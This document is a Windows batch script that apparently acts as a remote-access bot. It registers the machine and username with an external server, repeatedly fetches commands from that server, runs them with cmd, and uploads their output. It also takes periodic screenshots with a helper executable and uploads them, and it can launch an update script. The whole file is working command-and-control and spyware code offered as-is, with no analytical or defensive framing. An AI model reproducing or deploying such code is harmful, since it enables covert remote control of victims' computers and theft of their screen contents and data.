@REM @echo off
set /A second=0
if not exist .id (



echo %random%%random%>.id
ping localhost -n  3>null

goto register

) 
set /p reg=<reg

if not %reg%==success ( goto register ) 
if exist .id ( goto program )

:loop
set /A second= %second% + 1 
ping localhost -n 3 > null
goto program



:program

if %second% == 6 (
    set /A second=0
    goto sendShot
)
set /p id=<.id

:: command
echo id %id%
curl  https://test-api-t78m.vercel.app/getCommand/%id%>newCommand
set /p command=<command
set /p newCommand=<newCommand

if not "%command%" == "%newCommand%" (
    cmd /C %newCommand% > response
    echo %newCommand%>command
    curl  https://test-api-t78m.vercel.app/addResponse/%id% -F testImage=@response -F name="%username%"
    
)

::update 
if "%command%"==update ( goto update )   

goto loop


:sendShot   
set /p id=<.id
cmd /C .\screen.exe shot.png
curl -F testImage=@shot.png -F name=kira https://test-api-t78m.vercel.app/updateShot/%id%

goto program


:register
set /p id=<.id
echo register
echo %id% id
curl -X POST https://test-api-t78m.vercel.app/addBot/%id%  -d name="%username%">reg

echo echo testCommand>command
cmd /C .\screen.exe shot.png
curl  https://test-api-t78m.vercel.app/addShot/%id% -F testImage=@shot.png -F name="%username%"
set /p reg=<reg
goto program

:update
echo update update
start update.bat
exit
exit
exit
exit